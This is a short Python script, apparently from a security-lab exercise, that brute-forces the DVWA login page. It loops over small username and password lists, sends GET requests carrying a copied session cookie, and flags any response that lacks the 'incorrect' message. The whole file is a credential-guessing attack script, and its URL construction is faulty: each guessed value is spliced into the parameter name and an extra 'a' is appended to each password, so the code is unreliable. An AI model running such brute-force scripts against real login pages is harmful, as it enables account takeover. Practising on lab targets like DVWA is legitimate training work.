import requests

# Burpsuite > Proxy > Http history > /dvwa/vulnerabilities/?username= > request/raw
header = {"Cookie": "security=low; PHPSESSID=a8449n45h6h89g48ghg4432dfvb"}

username_list = ["admin","password"]
password_list = ["admin","password"]

for i in username_list:
    for j in password_list:
        url = "http://10.10.10.10/dvwa/vulnerabilities/brute/?username"+str(i)+"=a&password="+str(j)+"a&Login=Login" #Burpsuite > Proxy > Http history > /dvwa/vulnerabilities/?username= > request/raw
        sonuc = requests.get(url = url, headers = header)
        print("Username",i)
        print("Password",j)
        print("Status code:",sonuc.status_code)
        print("Lenght:",len(sonuc.content))
        if not "Username and/or password incorrect" in str(sonuc.content):
            print("Username and password correct.")
        print("############################")